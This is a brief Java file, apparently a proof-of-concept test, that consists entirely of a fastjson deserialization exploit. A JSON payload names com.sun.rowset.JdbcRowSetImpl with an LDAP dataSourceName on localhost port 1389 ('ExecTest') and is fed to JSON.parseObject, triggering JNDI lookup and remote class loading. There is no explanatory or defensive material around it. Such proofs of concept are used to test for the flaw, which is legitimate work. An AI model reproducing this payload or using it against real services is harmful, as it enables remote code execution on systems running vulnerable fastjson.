package net.evecom.core.command;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.Feature;

/**
 * @author linjunzhen
 * @version 1.0
 * @date 2022/6/22 14:37
 */
public class Test2 {

    public static void main(String[] args) {
        String payload = "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\", \"dataSourceName\":\"ldap://127.0.0.1:1389/ExecTest\", \"autoCommit\":true}";
        JSON.parseObject(payload, Feature.SupportNonPublicField);
    }

}